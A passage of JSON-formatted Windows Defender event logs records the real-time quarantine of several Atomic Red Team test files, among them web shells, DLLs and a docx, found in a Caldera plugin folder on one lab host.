1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813987)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Wacatac.H!ml&threatid=2147814523&enterprise=0\r\n \tName: Trojan:Win32/Wacatac.H!ml\r\n \tID: 2147814523\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1546\\bin\\AltWinSock2DLL.dll\r\n \tDetection Origin: Local machine\r\n \tDetection Type: FastPath\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813982)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Backdoor:Java/WebShell.D!dha&threatid=2147940541&enterprise=0\r\n \tName: Backdoor:Java/WebShell.D!dha\r\n \tID: 2147940541\r\n \tSeverity: Severe\r\n \tCategory: Backdoor\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1505.003\\src\\tests.jsp\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813982)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Backdoor:Java/WebShell.D!dha&threatid=2147940541&enterprise=0\r\n \tName: Backdoor:Java/WebShell.D!dha\r\n \tID: 2147940541\r\n \tSeverity: Severe\r\n \tCategory: Backdoor\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1505.003\\src\\tests.jsp\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813976)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Backdoor:ASP/Ace.T&threatid=2147683177&enterprise=0\r\n \tName: Backdoor:ASP/Ace.T\r\n \tID: 2147683177\r\n \tSeverity: Severe\r\n \tCategory: Backdoor\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1505.003\\src\\cmd.aspx\r\n \tDetection Origin: Local machine\r\n \tDetection Type: FastPath\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813976)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Backdoor:ASP/Ace.T&threatid=2147683177&enterprise=0\r\n \tName: Backdoor:ASP/Ace.T\r\n \tID: 2147683177\r\n \tSeverity: Severe\r\n \tCategory: Backdoor\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1505.003\\src\\cmd.aspx\r\n \tDetection Origin: Local machine\r\n \tDetection Type: FastPath\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813966)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:JS/Jsprat&threatid=2147708292&enterprise=0\r\n \tName: HackTool:JS/Jsprat\r\n \tID: 2147708292\r\n \tSeverity: High\r\n \tCategory: Tool\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1505.003\\src\\b.jsp\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813966)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:JS/Jsprat&threatid=2147708292&enterprise=0\r\n \tName: HackTool:JS/Jsprat\r\n \tID: 2147708292\r\n \tSeverity: High\r\n \tCategory: Tool\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1505.003\\src\\b.jsp\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813960)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Ransom:Win32/CVE&threatid=2147760253&enterprise=0\r\n \tName: Ransom:Win32/CVE\r\n \tID: 2147760253\r\n \tSeverity: Severe\r\n \tCategory: Ransomware\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1221\\src\\Calculator.docx\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813960)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Ransom:Win32/CVE&threatid=2147760253&enterprise=0\r\n \tName: Ransom:Win32/CVE\r\n \tID: 2147760253\r\n \tSeverity: Severe\r\n \tCategory: Ransomware\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1221\\src\\Calculator.docx\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813951)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Conteban.A!ml&threatid=2147735506&enterprise=0\r\n \tName: Trojan:Win32/Conteban.A!ml\r\n \tID: 2147735506\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1218.011\\bin\\_WT.init\r\n \tDetection Origin: Local machine\r\n \tDetection Type: FastPath\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813951)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Conteban.A!ml&threatid=2147735506&enterprise=0\r\n \tName: Trojan:Win32/Conteban.A!ml\r\n \tID: 2147735506\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1218.011\\bin\\_WT.init\r\n \tDetection Origin: Local machine\r\n \tDetection Type: FastPath\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813944)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Occamy!rfn&threatid=2147924747&enterprise=0\r\n \tName: Trojan:Win32/Occamy!rfn\r\n \tID: 2147924747\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1218.010\\bin\\AllTheThingsx86.dll\r\n \tDetection Origin: Local machine\r\n \tDetection Type: FastPath\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813944)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Occamy!rfn&threatid=2147924747&enterprise=0\r\n \tName: Trojan:Win32/Occamy!rfn\r\n \tID: 2147924747\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1218.010\\bin\\AllTheThingsx86.dll\r\n \tDetection Origin: Local machine\r\n \tDetection Type: FastPath\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
